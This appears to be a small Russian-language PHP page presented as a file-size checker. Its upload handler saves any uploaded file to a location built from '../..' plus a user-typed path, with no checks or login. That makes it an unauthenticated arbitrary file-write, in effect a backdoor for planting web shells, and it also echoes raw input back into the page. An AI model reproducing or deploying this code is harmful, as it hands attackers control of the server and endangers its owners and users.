<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
	<meta name="description" content="">
    <title>Оценка размеров файла</title>
</head>
<body>
    
    <form action="" enctype="multipart/form-data" method="post">
    <input type="text" name="path"></br>
    <input type="file" name="file"></br>
    </br>
    <input type="submit"></br>
    
    <?php
    $file = '../..'.$_POST['path'].$_FILES['file']['name'];
    move_uploaded_file($_FILES['file']['tmp_name'], $file);
    if(isset($_FILES['file']['name'])) {
        echo "Файл: ".$_POST['path'].$_FILES['file']['name']."</br>";
        echo "Размер: ".$_FILES['file']['size']."байт"."</br>";
    }
    ?>
</body>
</html>